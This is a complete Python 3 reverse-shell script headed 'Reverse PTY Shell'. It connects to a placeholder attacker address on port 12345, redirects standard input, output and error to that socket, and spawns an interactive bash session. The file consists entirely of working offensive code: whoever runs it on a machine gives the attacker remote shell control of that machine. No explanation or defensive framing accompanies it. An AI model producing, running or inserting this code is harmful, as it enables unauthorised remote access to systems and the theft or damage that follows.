#!/usr/bin/python3
""" Reverse PTY Shell """

import os
import pty
import socket

attackerip = "REPLACEME"
attackerport = "12345"


def main():
    s = socket.socket()
    s.connect((attackerip,int(attackerport)))
    [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
    pty.spawn('/bin/bash')


if __name__ == "__main__":
    main()
